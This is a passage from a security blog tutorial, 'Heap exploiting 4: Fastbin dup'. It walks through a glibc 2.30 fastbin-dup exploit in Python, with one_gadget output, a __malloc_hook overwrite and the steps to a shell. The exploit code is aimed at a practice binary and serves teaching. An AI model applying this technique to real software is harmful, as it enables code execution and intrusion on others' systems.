# Libc path being ../.glibc/glibc_2.30_no-tcache/libc.so.6

$ one_gadget ../.glibc/glibc_2.30_no-tcache/libc.so.6
0xc4dbf execve("/bin/sh", r13, r12)
constraints:
  [r13] == NULL || r13 == NULL
  [r12] == NULL || r12 == NULL

0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xe1fad execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL
</code></pre></div></div>

<p>From this output we have have three possible gadgets. So we will have to check the constraints manually.</p>

<p>We run the binary without the cyclic pattern like so:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dup = malloc(0x68, p64(libc.sym.__malloc_hook - 35))

# Then we request Chunk_b.
malloc(0x68, "A")
# Request Chunk_A again.
malloc(0x68, "B")
# set the malloc hook to a predefined location.
malloc(0x68, b"C"*19 + p64(0xc0debabe))
r.interactive()
</code></pre></div></div>
<p>This will set the malloc hook to call 0xc0debabe and when it hits that it will throw a segfault because it cannot find a function at that address.</p>

<p>run it with <code class="language-plaintext highlighter-rouge">python exploit.py GDB</code> and request one more memory chunk from malloc. You should see the gdb prompt break.
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-12-08-46-34.png" alt="" /></p>

<p>As you can see the first one_gadget is not valid because R12 &amp; R12 both are assigned. So what about the second one_gadget?
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-12-08-57-17.png" alt="" /></p>

<p>Rsp+0x50 should be null. While it is currently a pointer to the “CCCCCCCC” string, but as you may have guessed it. That is user controlled, So what would happen if you would replace the CCCCC with null bytes?
Replace:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc(0x68, b"C"*19 + p64(0xc0debabe))
</code></pre></div></div>
<p>with:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc(0x68, p8(0)*19 + p64(0xc0debabe))
</code></pre></div></div>
<p>This will print the nullbyte 19 times and then our malloc_hook value.</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-12-09-00-28.png" alt="" /></p>

<p>JACKPOT! Our stack value is null.</p>

<p>Now lets use the One_gadget to gain a shell.
We replace the 0xc0debabe value with the base of the libc library and append our one_gadget address.
Replace:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc(0x68, p8(0)*19 + p64(0xc0debabe))

</code></pre></div></div>
<p>with:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc(0x68, p8(0)*19 + p64(libc.address + 0xe1fa1)))
# Call the malloc hook.
malloc(10,"")
</code></pre></div></div>

<p>when we run it this time we should get a shell.
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-12-09-05-45.png" alt="" /></p>

<h1 id="conclusion">Conclusion:</h1>
<p>To be able to do this technique we have to be able to control the memory before the write address to fake the size field (or be lucky and have it set to one of the bin sizes).
And then we request a new chunk and overwrite the existing data.</p>


					<div class="post-share">
						<ul class="share-list list-reset">
							<li class="share-item">
								<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/new_blog/heap-exploiting-4/"
								onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
								title="Share on Facebook" rel="nofollow">
									<i class="ion ion-logo-facebook"></i>
								</a>
							</li>
					
							<li class="share-item">
								<a class="share-twitter" href="https://twitter.com/intent/tweet?text=Heap%20exploiting%204:%20Fastbin%20dup&url=http://localhost:4000/new_blog/heap-exploiting-4/"
								onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
								title="Share on Twitter" rel="nofollow">
									<i class="ion ion-logo-twitter"></i>
								</a>
							</li>
					
							<li class="share-item">
								<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/new_blog/heap-exploiting-4/&title=Heap%20exploiting%204:%20Fastbin%20dup&summary=&source=What's%20upsecurity"
								onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
								title="Share on LinkedIn" rel="nofollow">
									<i class="ion ion-logo-linkedin"></i>
								</a>
							</li>
						</ul>
					</div>
				</div>

				<div class="post-navigation">
					
					<a href="/new_blog/heap-exploiting-3/" class="prev">
						<div class="post-nav-arrow"><i class="ion ion-ios-arrow-round-back"></i> Previous Article</div>
						<h2 class="post-nav-title">Heap exploiting 3: House of force</h2>
					</a>
					 
					<a href="/new_blog/heap-exploiting-5/" class="next">
						<div class="post-nav-arrow">Next Article <i class="ion ion-ios-arrow-round-forward"></i></div>
						<h2 class="post-nav-title">Heap exploiting 5: House of Spirit</h2>
					</a>
					
				</div>

			</div>
			
	</article> <!-- /.post -->

	<div class="col col-12 col-t-4">
		<aside class="sidebar">
  
  
  <div class="widget widget-recent">
    <h3 class="widget-title">Recent Posts</h3>
    
    <div class="recent-posts">
      
      
      <div class="recent-content">
        <h6 class="recent-title"><a href="/new_blog/test-encrypt/">test page linux</a></h6>
        <div class="recent-date">
          <time datetime="2021-04-05T09:01:55+02:00">April 5, 2021</time>
        </div>
      </div>
    </div>
    
    <div class="recent-posts">
      
      
      <div class="recent-content">
        <h6 class="recent-title"><a href="/new_blog/test-encrypt-windows/">test page windows</a></h6>
        <div class="recent-date">
          <time datetime="2021-04-04T09:05:55+02:00">April 4, 2021</time>
        </div>
      </div>
    </div>
    
    <div class="recent-posts">
      
      <div class="recent-header">
        <a class="recent-image" href="/new_blog/covidlock/" style="background-image: url(/new_blog/img//covidlock/Clipboard_2021-01-15-09-39-42.png)"></a>
      </div>
      
      <div class="recent-content">
        <h6 class="recent-title"><a href="/new_blog/covidlock/">CovidLock Ransomware Analysis</a></h6>
        <div class="recent-date">
          <time datetime="2020-12-08T08:05:55+01:00">December 8, 2020</time>
        </div>
      </div>
    </div>
    
    <div class="recent-posts">
      
      <div class="recent-header">
        <a class="recent-image" href="/new_blog/Multimaster/" style="background-image: url(/new_blog/img/HackTheBox/Multimaster.jpg)"></a>
      </div>
      
      <div class="recent-content">
        <h6 class="recent-title"><a href="/new_blog/Multimaster/">Hack the box: Multimaster</a></h6>
        <div class="recent-date">
          <time datetime="2020-11-20T20:25:55+01:00">November 20, 2020</time>
        </div>
      </div>
    </div>
    
  </div>
  

  <div class="widget widget-social">
    <h3 class="widget-title">Subscribe & Follow</h3>
    <ul class="social-profiles list-reset">
      
      <li class="social-profiles-item">
        <a href="https://github.com/wotwot563" class="social-profiles-link"><i class="ion ion-logo-github"></i></a>
      </li>
      

       
      <li class="social-profiles-item">
        <a href="https://twitter.com/wotwot563" class="social-profiles-link"><i class="ion ion-logo-twitter"></i></a>
      </li>
      

      
      <li class="social-profiles-item">
        <a href="wotwot#5016" class="social-profiles-link"><i class="ion"><img style="height:16px; width: 16px" src="/new_blog/img/Icons/discord.ico"></i></a>
      </li>
      

      
      <li class="social-profiles-item">
        <a href="https://ctftime.org/user/77238" class="social-profiles-link"><i class="ion"><img style="height:16px; width: 16px" src="/new_blog/img/Icons/ctftime.png"></i></a>
      </li>
      
    </ul>
  </div>

  

  <div class="widget widget-tags">
    <h3 class="widget-title">Tag Cloud</h3>
     
    <ul class="tag-list list-reset">
    
      
        <li class="tag-item"><a href="/new_blog/tags#Android+Malware" class="tag">Android Malware</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#Covert+Channel" class="tag">Covert Channel</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#HBCU" class="tag">HBCU</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#HackTheBox" class="tag">HackTheBox</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#Heap+exploiting" class="tag">Heap exploiting</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#Linux" class="tag">Linux</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#Lockpicking" class="tag">Lockpicking</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#Windows" class="tag">Windows</a></li>
      
    
      
        <li class="tag-item"><a href="/new_blog/tags#encrypted+text" class="tag">encrypted text</a></li>
      
    
    
    </ul>
  </div>
  
</aside> <!-- /.sidebar -->
	</div>

	</div>
</div>

  <footer class="footer">
  <div class="container">
    <div class="row">
      <div class="col col-12">
        <div class="footer-top">
          <h2 class="logo-title">
            <a href="/new_blog/" class="logo-text">UPsecurity</a>
          </h2>
          <div class="top"><i class="ion ion-ios-arrow-up"></i></div>
        </div>
        <div class="footer-bottom">

          <div class="footer-social">
            <ul class="list-reset">
              
              <li><a href="https://github.com/wotwot563">Github</a></li>
              

              
              <li><a href="https://twitter.com/wotwot563">Twitter</a></li>
              

              
              <li><a href="wotwot#5016">Discord</a></li>
              

              
              <li><a href="https://ctftime.org/user/77238">CTFTime</a></li>
              
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div>
</footer> <!-- /.footer -->
  <script src="/new_blog/js/jquery-3.3.1.min.js"></script>
<script src="/new_blog/js/simple-jekyll-search.min.js"></script>
<script>
  SimpleJekyllSearch({
  searchInput: document.getElementById("js-search-input"),
  resultsContainer: document.getElementById("js-results-container"),
  json: "/new_blog/search.json",
  searchResultTemplate:
    '<li class="search-item"><a class="search-link" href="{url}">{title}</a></li>',
  noResultsText: '<li class="search-no-item">No results found</li>'
  });
</script>
<script src="/new_blog/js/instafeed.min.js"></script>
<script src="/new_blog/js/jquery.waitforimages.min.js"></script>
<script src="/new_blog/js/jquery.fitvids.js"></script>
<script src="/new_blog/js/common.js"></script>


</body>

</html>
